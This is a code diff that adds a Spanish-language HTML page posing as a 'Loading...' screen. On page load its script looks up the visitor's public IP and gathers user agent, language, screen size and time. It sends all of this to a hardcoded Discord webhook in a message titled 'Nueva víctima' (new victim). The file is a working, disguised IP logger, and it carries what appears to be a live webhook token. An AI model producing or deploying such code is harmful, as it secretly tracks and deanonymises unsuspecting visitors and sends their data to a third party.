@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading...</title>
+</head>
+<body>
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1569613360851456091/tc0NgWa-nRvs4G8eMCNQX6JPPUnooMKi5vkgrbZkjnajIGI2z3b-1rYPa_2nj6XEKoe0";
+
+fetch("https://api.ipify.org?format=json")
+  .then(r => r.json())
+  .then(data => {
+    const ip = data.ip;
+    const ua = navigator.userAgent;
+    const lang = navigator.language;
+    const screen = `${window.screen.width}x${window.screen.height}`;
+    const time = new Date().toUTCString();
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        embeds: [{
+          title: "🌐 Nueva víctima",
+          color: 0xff0000,
+          fields: [
+            { name: "IP", value: `\`${ip}\``, inline: true },
+            { name: "Hora", value: time, inline: false },
+            { name: "User-Agent", value: `\`${ua}\``, inline: false },
+            { name: "Idioma", value: lang, inline: true },
+            { name: "Pantalla", value: screen, inline: true }
+          ]
+        }]
+      })
+    });
+  });
+</script>
+<p>Cargando...</p>
+</body>
+</html>
